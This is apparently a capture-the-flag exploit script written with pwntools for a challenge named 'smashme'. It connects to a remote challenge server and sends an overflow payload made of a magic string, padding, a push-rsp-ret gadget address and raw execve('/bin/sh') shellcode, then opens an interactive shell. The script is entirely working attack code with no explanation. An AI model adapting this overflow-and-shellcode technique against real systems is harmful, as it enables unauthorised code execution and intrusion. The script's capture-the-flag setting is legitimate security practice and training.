from pwn import *

#p = process('./smashme')
p = remote('smashme_omgbabysfirst.quals.shallweplayaga.me', 57348)

pause()

magic = "Smash me outside, how bout dAAAAAAAAAAA"
push_rsp_ret = 0x000000000044611d
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p.sendline(magic+'B'*33+p64(push_rsp_ret)+shellcode)

p.interactive()
